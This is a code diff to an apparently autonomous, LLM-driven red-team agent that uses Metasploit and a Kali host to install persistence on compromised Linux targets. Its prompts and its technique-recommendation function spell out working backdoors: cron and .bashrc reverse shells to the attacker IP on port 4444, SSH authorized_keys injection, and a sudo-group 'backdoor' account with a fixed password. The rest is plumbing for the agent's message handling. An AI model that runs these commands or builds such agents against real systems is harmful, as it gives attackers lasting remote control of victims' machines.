@@ -35,14 +35,14 @@ from core_agents.common import (
 )
 from core_agents.state import PersistenceFindings
 from tools.rag import query_knowledge_base
-from tools.metasploit_tools import msf_session
+from tools.metasploit_tools import msf_session, tool_session_command
 
 # =============================================================================
 # CONSTANTS
 # =============================================================================
 
 MAX_PERSISTENCE_RETRIES = 5
-MAX_PLANNER_TOOL_CALLS = 5
+MAX_PLANNER_TOOL_CALLS = 3
 MAX_EXECUTOR_TOOL_CALLS = 10
 MAX_VERIFIER_TOOL_CALLS = 5
 
@@ -70,9 +70,11 @@ class PersistenceState(TypedDict):
 @tool
 def tool_linux_terminal(command: str):
     """
-    Execute a shell command on the Kali machine via SSH.
-    Use this to install persistence mechanisms on the target via the active session,
-    or to run commands through a reverse shell.
+    Execute a shell command on the KALI ATTACKER machine via SSH.
+    This runs on Kali — NOT on the target. Use ONLY for Kali-side tasks:
+    - ssh-keygen, starting listeners, SSH login tests, receiving files.
+
+    To run commands on the TARGET, use tool_session_command instead.
 
     NON-INTERACTIVE ONLY. No ftp, ssh, vi, nano, top.
     Use non-interactive flags (e.g., -y).
@@ -86,13 +88,10 @@ def tool_linux_terminal(command: str):
 @tool
 def tool_metasploit_rpc(command: str):
     """
-    Execute a command on the active Metasploit console.
-    State is preserved across calls.
+    Execute a command on the Metasploit CONSOLE.
+    Use ONLY for MSF console commands: listing sessions, background, use, set, run, exploit.
 
-    Use this to interact with Meterpreter sessions for persistence:
-    - 'sessions -i <id>' to interact with a session
-    - Upload files, run post-exploitation modules
-    - 'run persistence' or post/multi/manage modules
+    Do NOT use this for running commands on the target — use tool_session_command instead.
     """
     try:
         return msf_session.send_command(command)
@@ -102,8 +101,8 @@ def tool_metasploit_rpc(command: str):
 
 # Tool sets
 PLANNER_TOOLS = [query_knowledge_base]
-EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc]
-VERIFIER_TOOLS = [tool_linux_terminal]
+EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command]
+VERIFIER_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command]
 
 # =============================================================================
 # SYSTEM PROMPTS
@@ -114,39 +113,37 @@ PLANNER_PROMPT = f"""You are a Persistence Planner for a Red Team agent. Your at
 You receive:
 1. TARGET IP, SESSION ID, SESSION TYPE, ACCESS LEVEL — details of the active session
 2. OBJECTIVE — the operator's overall goal
-3. CRITIC FEEDBACK — if retrying, what went wrong last time
+3. RECOMMENDED TECHNIQUES — pre-verified techniques for the current access level and session type
+4. CRITIC FEEDBACK — if retrying, what went wrong last time
 
 Your job: choose ONE persistence technique and produce a step-by-step installation plan.
 
-**You have access to `query_knowledge_base`** — a RAG tool that searches your internal knowledge base
-of post-exploitation and persistence techniques.
+**TOOL CLARITY — 3 tools, 3 different targets:**
+- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for all target commands: whoami, crontab, echo, mkdir, chmod, etc.)
+- `tool_linux_terminal(command)` → runs ON KALI only (ssh-keygen, starting listeners, SSH login tests)
+- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, background, use, set, run)
 
-**Before producing your plan, query the knowledge base** for relevant techniques:
-- Search for persistence techniques suitable for the target OS and access level
-- Use verbose queries (e.g., "Linux persistence techniques for user-level access using cron jobs and SSH keys")
-- You may make up to {MAX_PLANNER_TOOL_CALLS} queries
+**TECHNIQUE SELECTION:**
+PRIORITIZE the RECOMMENDED TECHNIQUES provided in the context — these are pre-verified and reliable.
+Only query the knowledge base if ALL recommended techniques have already failed or if you need
+a novel technique not in the list.
 
-**Technique selection (choose based on access level):**
+**You have access to `query_knowledge_base`** — a RAG tool for searching post-exploitation techniques.
+Use it as a FALLBACK only (max {MAX_PLANNER_TOOL_CALLS} queries). Focus queries on specific novel
+techniques, NOT generic "persistence" searches.
 
-If access_level == "root":
-1. SSH authorized_keys injection (most reliable)
-2. Cron job backdoor (reverse shell on schedule)
-3. Systemd service (persistent daemon)
-4. New user account with SSH access
-
-If access_level == "user":
-1. SSH authorized_keys injection (into user's ~/.ssh/)
-2. User-level cron job
-3. Bash profile backdoor (~/.bashrc, ~/.profile)
-4. At job scheduling
+**SESSION TYPE AWARENESS:**
+- **command_shell**: Raw shell only. All persistence must use standard Linux commands (echo, crontab, mkdir, chmod, etc.). No MSF post modules, no `upload`, no `run persistence`.
+- **meterpreter**: Full MSF post-exploitation available. Can use `upload`, `run`, post modules.
 
 **Output format (final answer — no more tool calls):**
 
 PERSISTENCE PLAN:
-TECHNIQUE: <method name, e.g., "ssh_key">
+TECHNIQUE: <method name, e.g., "cron_job">
 ACCESS_LEVEL: <current access level>
+SESSION_TYPE: <command_shell or meterpreter>
 STEPS:
-1. <exact command or action>
+1. <exact command or action, specifying which tool to use>
 2. <exact command or action>
 ...
 
@@ -156,13 +153,29 @@ VERIFICATION_PLAN:
 
 **On retry:**
 - Read the critic's feedback carefully
-- Choose a DIFFERENT technique from the list above
+- Choose a DIFFERENT technique from the recommended list
 - Do NOT repeat a technique that already failed
 """
 
 EXECUTOR_PROMPT = f"""You are a Persistence Executor for a Red Team agent. Your attacker IP is {KALI_IP}.
 
-You have access to `tool_linux_terminal` (SSH to Kali) and `tool_metasploit_rpc` (MSF console).
+You have 3 tools — each runs in a DIFFERENT place:
+
+**TOOL CLARITY:**
+- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for ALL target commands)
+- `tool_linux_terminal(command)` → runs ON KALI only (ssh-keygen, listeners, SSH login tests)
+- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, background, etc. — NOT for target commands)
+
+**CRITICAL:** To run commands on the target, ALWAYS use `tool_session_command`. This is reliable and atomic.
+Do NOT use `tool_metasploit_rpc` for target commands — it goes through the MSF console which is unreliable.
+Do NOT use `tool_linux_terminal` for target commands — that runs on Kali, not the target.
+
+- **NEVER use `sudo` through a session** — if you have root access, you already ARE root. If you don't, sudo won't work (no TTY).
+
+**SESSION TYPE AWARENESS:**
+- **command_shell**: Raw shell. Use standard Linux commands only. No `upload`, no `run`, no post modules.
+- **meterpreter**: Full MSF post-exploitation. Can use `upload`, `run persistence`, post modules, etc.
+- Match your commands to the session type. Do NOT try meterpreter commands on a command_shell.
 
 **Your job:** Execute the persistence installation plan step by step.
 
@@ -171,29 +184,22 @@ You have access to `tool_linux_terminal` (SSH to Kali) and `tool_metasploit_rpc`
 2. READ each output carefully before proceeding
 3. If a command fails, adapt (e.g., create directories, fix permissions)
 4. Do NOT run more than {MAX_EXECUTOR_TOOL_CALLS} commands total
-5. When working through an active session (shell/meterpreter), use the appropriate tool:
-   - For Meterpreter sessions: use `tool_metasploit_rpc` with 'sessions -i <id>' first
-   - For command shells: pipe commands through the session or use tool_linux_terminal on Kali
+5. Do NOT try to create objective files (like i_got_in.txt) — that is the Impact stage's job. Focus ONLY on persistence.
+6. Do NOT use `crontab -e` (interactive). Use `echo '...' | crontab -` instead.
 
-**Common persistence commands (adapt to the plan):**
+**Step-by-step example for cron job persistence (session 3):**
 
-SSH Key Injection:
-- Generate key: ssh-keygen -t rsa -f /tmp/persist_key -N ""
-- Copy public key to target's authorized_keys via the session
-- Ensure .ssh directory exists with correct permissions (700)
-- Ensure authorized_keys has correct permissions (600)
+1. tool_session_command("3", "whoami")                          ← confirm access level ON TARGET
+2. tool_session_command("3", "echo \\"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1'\\" | crontab -")
+3. tool_session_command("3", "crontab -l")                      ← verify cron is set ON TARGET
 
-Cron Job:
-- echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{KALI_IP}/<PORT> 0>&1'" | crontab -
-- Or write to /etc/cron.d/ if root
+**Step-by-step example for SSH key injection (session 3):**
 
-Systemd Service:
-- Write a .service unit file to /etc/systemd/system/
-- systemctl daemon-reload && systemctl enable <service>
-
-User Account:
-- useradd -m -s /bin/bash <user> && echo '<user>:<pass>' | chpasswd
-- Add to sudoers if root access available
+1. tool_linux_terminal("ssh-keygen -t rsa -f /tmp/persist_key -N \\"\\"")   ← generate key on KALI
+2. tool_linux_terminal("cat /tmp/persist_key.pub")                           ← read public key on KALI
+3. tool_session_command("3", "mkdir -p ~/.ssh && chmod 700 ~/.ssh")          ← create dir ON TARGET
+4. tool_session_command("3", "echo '<pubkey contents>' >> ~/.ssh/authorized_keys")  ← inject key ON TARGET
+5. tool_session_command("3", "chmod 600 ~/.ssh/authorized_keys")             ← set perms ON TARGET
 
 **When done, provide a text summary of what was installed and where.**
 Do not make any more tool calls after providing your summary.
@@ -201,28 +207,35 @@ Do not make any more tool calls after providing your summary.
 
 VERIFIER_PROMPT = f"""You are a Persistence Verifier for a Red Team agent. Your attacker IP is {KALI_IP}.
 
-You have access to `tool_linux_terminal` to run verification commands on Kali.
+You have 3 tools:
+- `tool_session_command(session_id, command)` — run commands ON THE TARGET (crontab -l, systemctl, grep, etc.)
+- `tool_linux_terminal(command)` — run commands on KALI (SSH login tests, checking listeners)
+- `tool_metasploit_rpc(command)` — MSF console only (listing sessions, etc.)
 
 **Your job:** Verify that the installed persistence mechanism actually works.
+
+**CRITICAL — WHERE TO RUN VERIFICATION:**
+- To check things ON THE TARGET (crontab -l, systemctl, /etc/passwd), use `tool_session_command`.
+- To check things FROM KALI (SSH login test, listener check), use `tool_linux_terminal`.
+- Do NOT use `tool_metasploit_rpc` for running commands on the target.
 
 **Verification strategies by technique:**
 
 SSH Key:
-- Try: sshpass or ssh -i /tmp/persist_key -o StrictHostKeyChecking=no <user>@<target> "whoami"
+- FROM KALI: `tool_linux_terminal("ssh -i /tmp/persist_key -o StrictHostKeyChecking=no <user>@<target> whoami")`
 - Expected: returns the username without password prompt
 
 Cron Job:
-- Check on target: crontab -l (via the session) to confirm the job is listed
-- Or wait for the cron to fire and check for a new session on Kali
-- Check: ls -la /var/spool/cron/ or /etc/cron.d/
+- ON TARGET: `tool_session_command("<session_id>", "crontab -l")`
+- Expected: see the reverse shell cron entry
 
 Systemd Service:
-- Check: systemctl status <service> — should show "active" or "enabled"
-- Check: systemctl is-enabled <service>
+- ON TARGET: `tool_session_command("<session_id>", "systemctl is-enabled <service>")`
+- Expected: "enabled"
 
 User Account:
-- Try: sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no <user>@<target> "whoami"
-- Or check: grep <user> /etc/passwd (via session)
+- FROM KALI: `tool_linux_terminal("sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no <user>@<target> whoami")`
+- Or ON TARGET: `tool_session_command("<session_id>", "grep <user> /etc/passwd")`
 
 **Rules:**
 1. Run verification commands ONE AT A TIME
@@ -275,6 +288,150 @@ FEEDBACK: <if FAIL — specific instructions for retry.
 """
 
 # =============================================================================
+# MESSAGE HELPERS
+# =============================================================================
+
+def _sanitize_message_window(messages: list) -> list:
+    """Ensure message ordering is valid for the OpenAI API.
+
+    Handles two failure modes:
+    1. Orphaned ToolMessage — no preceding AIMessage with tool_calls → drop it
+    2. AIMessage with tool_calls but missing ToolMessage responses → add dummy responses
+
+    Both cause OpenAI 400 errors and crash the subgraph.
+    """
+    sanitized = []
+    i = 0
+    while i < len(messages):
+        msg = messages[i]
+        if isinstance(msg, AIMessage) and getattr(msg, 'tool_calls', None):
+            # AI message with tool_calls: collect all following ToolMessages
+            sanitized.append(msg)
+            expected_ids = {tc['id'] for tc in msg.tool_calls}
+            found_ids = set()
+            j = i + 1
+            while j < len(messages) and isinstance(messages[j], ToolMessage):
+                if messages[j].tool_call_id in expected_ids:
+                    sanitized.append(messages[j])
+                    found_ids.add(messages[j].tool_call_id)
+                j += 1
+            # Add dummy responses for any missing tool_call_ids
+            for missing_id in expected_ids - found_ids:
+                sanitized.append(ToolMessage(
+                    content="[No output captured]",
+                    tool_call_id=missing_id,
+                ))
+            i = j
+        elif isinstance(msg, ToolMessage):
+            # Orphaned ToolMessage (no preceding AI with tool_calls) — skip
+            i += 1
+        else:
+            sanitized.append(msg)
+            i += 1
+    return sanitized
+
+def _get_recommended_techniques(access_level: str, session_type: str, session_id: str) -> str:
+    """Return deterministic persistence technique recommendations based on context.
+
+    These are pre-verified, reliable techniques that the planner should try BEFORE
+    falling back to RAG. Keeps RAG available for novel techniques when these are exhausted.
+    """
+    techniques = []
+
+    if access_level == "root":
+        techniques.append({
+            "name": "Cron job backdoor",
+            "reliability": "HIGH",
+            "session_types": ["command_shell", "meterpreter"],
+            "steps": [
+                f'tool_session_command({session_id}, "whoami")  # confirm root access on TARGET',
+                f'tool_session_command({session_id}, "echo \\"* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\'\\" | crontab -")',
+                f'tool_session_command({session_id}, "crontab -l")  # verify on TARGET',
+            ],
+            "verification": "tool_session_command: crontab -l shows the reverse shell entry",
+            "notes": "Most reliable. Works on all Linux. Fires every minute.",
+        })
+        techniques.append({
+            "name": "SSH authorized_keys injection",
+            "reliability": "HIGH",
+            "session_types": ["command_shell", "meterpreter"],
+            "steps": [
+                'tool_linux_terminal: ssh-keygen -t rsa -f /tmp/persist_key -N ""   # on KALI',
+                "tool_linux_terminal: cat /tmp/persist_key.pub   # on KALI",
+                f'tool_session_command({session_id}, "mkdir -p /root/.ssh && chmod 700 /root/.ssh")  # on TARGET',
+                f'tool_session_command({session_id}, "echo \'<PUBKEY>\' >> /root/.ssh/authorized_keys")  # on TARGET',
+                f'tool_session_command({session_id}, "chmod 600 /root/.ssh/authorized_keys")  # on TARGET',
+            ],
+            "verification": "tool_linux_terminal: ssh -i /tmp/persist_key -o StrictHostKeyChecking=no root@<target> whoami",
+            "notes": "Reliable. Requires SSH service on target (port 22).",
+        })
+        techniques.append({
+            "name": "New user account with SSH",
+            "reliability": "MEDIUM",
+            "session_types": ["command_shell", "meterpreter"],
+            "steps": [
+                f'tool_session_command({session_id}, "useradd -m -s /bin/bash -G sudo backdoor")  # on TARGET',
+                f'tool_session_command({session_id}, "echo \'backdoor:backdoor123\' | chpasswd")  # on TARGET',
+            ],
+            "verification": "tool_linux_terminal: sshpass -p 'backdoor123' ssh -o StrictHostKeyChecking=no backdoor@<target> whoami",
+            "notes": "Creates a new login. Visible in /etc/passwd — less stealthy.",
+        })
+    else:
+        # user-level access
+        techniques.append({
+            "name": "User cron job backdoor",
+            "reliability": "HIGH",
+            "session_types": ["command_shell", "meterpreter"],
+            "steps": [
+                f'tool_session_command({session_id}, "whoami")  # confirm user on TARGET',
+                f'tool_session_command({session_id}, "echo \\"* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\'\\" | crontab -")',
+                f'tool_session_command({session_id}, "crontab -l")  # verify on TARGET',
+            ],
+            "verification": "tool_session_command: crontab -l shows the reverse shell entry",
+            "notes": "Works without root. User-level cron.",
+        })
+        techniques.append({
+            "name": "SSH authorized_keys injection (user)",
+            "reliability": "HIGH",
+            "session_types": ["command_shell", "meterpreter"],
+            "steps": [
+                'tool_linux_terminal: ssh-keygen -t rsa -f /tmp/persist_key -N ""   # on KALI',
+                "tool_linux_terminal: cat /tmp/persist_key.pub   # on KALI",
+                f'tool_session_command({session_id}, "mkdir -p ~/.ssh && chmod 700 ~/.ssh")  # on TARGET',
+                f'tool_session_command({session_id}, "echo \'<PUBKEY>\' >> ~/.ssh/authorized_keys")  # on TARGET',
+                f'tool_session_command({session_id}, "chmod 600 ~/.ssh/authorized_keys")  # on TARGET',
+            ],
+            "verification": "tool_linux_terminal: ssh -i /tmp/persist_key -o StrictHostKeyChecking=no <user>@<target> whoami",
+            "notes": "Requires SSH service on target.",
+        })
+        techniques.append({
+            "name": "Bash profile backdoor",
+            "reliability": "MEDIUM",
+            "session_types": ["command_shell", "meterpreter"],
+            "steps": [
+                f'tool_session_command({session_id}, "echo \'/bin/bash -c \\"bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\\" &\' >> ~/.bashrc")',
+                f'tool_session_command({session_id}, "cat ~/.bashrc | tail -3")  # verify on TARGET',
+            ],
+            "verification": "tool_session_command: cat ~/.bashrc shows the reverse shell line appended",
+            "notes": "Fires on next user login. Less reliable than cron.",
+        })
+
+    # Format for injection into context
+    output = "\n**RECOMMENDED TECHNIQUES (pre-verified, prioritize these):**\n"
+    for i, t in enumerate(techniques, 1):
+        compatible = "YES" if session_type in t["session_types"] else "NO (wrong session type)"
+        output += f"\n{i}. **{t['name']}** — Reliability: {t['reliability']}, Compatible: {compatible}\n"
+        output += f"   Steps:\n"
+        for step in t["steps"]:
+            output += f"     - {step}\n"
+        output += f"   Verification: {t['verification']}\n"
+        output += f"   Notes: {t['notes']}\n"
+
+    output += "\nUse these FIRST. Only query the knowledge base if all recommended techniques have failed.\n"
+    return output
+
+
+# =============================================================================
 # NODE IMPLEMENTATIONS
 # =============================================================================
 
@@ -297,13 +454,17 @@ def planner_node(state: PersistenceState) -> dict:
             planner_tool_count += 1
 
     if planner_tool_count == 0:
-        # First call: build context
+        # First call: build context with deterministic technique recommendations
         context = (
             f"TARGET: {target_ip}\n"
             f"SESSION: {session_type} (ID: {session_id})\n"
             f"ACCESS LEVEL: {access_level}\n"
             f"OBJECTIVE: {state.get('objective', '')}\n"
         )
+
+        # Inject deterministic technique recommendations
+        context += _get_recommended_techniques(access_level, session_type, session_id)
+
         # Include critic feedback if retrying
         for msg in reversed(messages):
             if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
@@ -311,13 +472,13 @@ def planner_node(state: PersistenceState) -> dict:
                 break
         planner_msgs = [HumanMessage(content=context)]
     else:
-        # Continuing ReAct loop — include from last HumanMessage
+        # Continuing ReAct loop — include from last HumanMessage, sanitized
         cycle_start = 0
         for i in range(len(messages) - 1, -1, -1):
             if isinstance(messages[i], HumanMessage):
                 cycle_start = i
                 break
-        planner_msgs = list(messages[cycle_start:])
+        planner_msgs = _sanitize_message_window(list(messages[cycle_start:]))
 
     # Safety valve
     if planner_tool_count >= MAX_PLANNER_TOOL_CALLS:
@@ -368,6 +529,7 @@ def executor_node(state: PersistenceState) -> dict:
             executor_msgs.append(msg)
     if not executor_msgs:
         executor_msgs = [messages[-1]]
+    executor_msgs = _sanitize_message_window(executor_msgs)
 
     # Safety valve
     if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS:
@@ -424,8 +586,8 @@ def verifier_node(state: PersistenceState) -> dict:
         )
         verifier_msgs = [HumanMessage(content=context)]
     else:
-        # Continuing ReAct loop — use recent messages
-        verifier_msgs = list(messages[-min(10, len(messages)):])
+        # Continuing ReAct loop — use recent messages, sanitized to avoid orphaned ToolMessages
+        verifier_msgs = _sanitize_message_window(list(messages[-min(10, len(messages)):]))
 
     # Safety valve
     if verifier_tool_count >= MAX_VERIFIER_TOOL_CALLS:
@@ -721,41 +883,51 @@ def run_persistence(
     print_colored(f"  Thread: {thread_id}", Colors.HEADER)
     print_colored(f"{'='*60}\n", Colors.HEADER)
 
-    for event in app.stream(initial_state, config=config):
-        for key, value in event.items():
-            if not value or "messages" not in value:
-                continue
-            msgs = value["messages"]
-            if not isinstance(msgs, list):
-                msgs = [msgs]
-            for msg in msgs:
-                if not isinstance(msg, BaseMessage) or not msg.content:
+    try:
+        for event in app.stream(initial_state, config=config):
+            for key, value in event.items():
+                if not value or "messages" not in value:
                     continue
-                if "CRITIC FEEDBACK" in msg.content:
-                    print_colored(f"\n{msg.content}", Colors.FAIL)
-                elif isinstance(msg, ToolMessage):
-                    display = msg.content[:500]
-                    if len(msg.content) > 500:
-                        display += "... [truncated]"
-                    print(f"\n[Tool Output]: {display}")
-                elif isinstance(msg, AIMessage):
-                    content = msg.content
-                    if "[Persistence Planner]" in content:
-                        print_colored(f"\n{content[:400]}", Colors.OKBLUE)
-                    elif "[Persistence Critic]" in content:
-                        color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
-                        print_colored(f"\n{content[:400]}", color)
-                    elif "[Persistence Verifier]" in content or "[Persistence Executor]" in content:
-                        print_colored(f"\n{content[:400]}", Colors.WARNING)
-                    else:
-                        print_colored(f"\nAgent: {content[:400]}", Colors.OKGREEN)
+                msgs = value["messages"]
+                if not isinstance(msgs, list):
+                    msgs = [msgs]
+                for msg in msgs:
+                    if not isinstance(msg, BaseMessage) or not msg.content:
+                        continue
+                    if "CRITIC FEEDBACK" in msg.content:
+                        print_colored(f"\n{msg.content}", Colors.FAIL)
+                    elif isinstance(msg, ToolMessage):
+                        display = msg.content[:500]
+                        if len(msg.content) > 500:
+                            display += "... [truncated]"
+                        print(f"\n[Tool Output]: {display}")
+                    elif isinstance(msg, AIMessage):
+                        content = msg.content
+                        if "[Persistence Planner]" in content:
+                            print_colored(f"\n{content[:400]}", Colors.OKBLUE)
+                        elif "[Persistence Critic]" in content:
+                            color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
+                            print_colored(f"\n{content[:400]}", color)
+                        elif "[Persistence Verifier]" in content or "[Persistence Executor]" in content:
+                            print_colored(f"\n{content[:400]}", Colors.WARNING)
+                        else:
+                            print_colored(f"\nAgent: {content[:400]}", Colors.OKGREEN)
 
-                if hasattr(msg, "tool_calls") and msg.tool_calls:
-                    for t in msg.tool_calls:
-                        print_colored(
-                            f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
-                            Colors.OKCYAN
-                        )
+                    if hasattr(msg, "tool_calls") and msg.tool_calls:
+                        for t in msg.tool_calls:
+                            print_colored(
+                                f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
+                                Colors.OKCYAN
+                            )
+    except Exception as e:
+        print_colored(f"\n[Persistence] Subgraph crashed: {e}", Colors.FAIL)
+        print_colored("[Persistence] Returning graceful failure.", Colors.WARNING)
+        return PersistenceFindings(
+            success=False,
+            method="error",
+            details=f"Crash: {str(e)[:200]}",
+            summary=f"Persistence crashed: {str(e)[:200]}",
+        )
 
     final_snapshot = app.get_state(config)
     final_state = final_snapshot.values
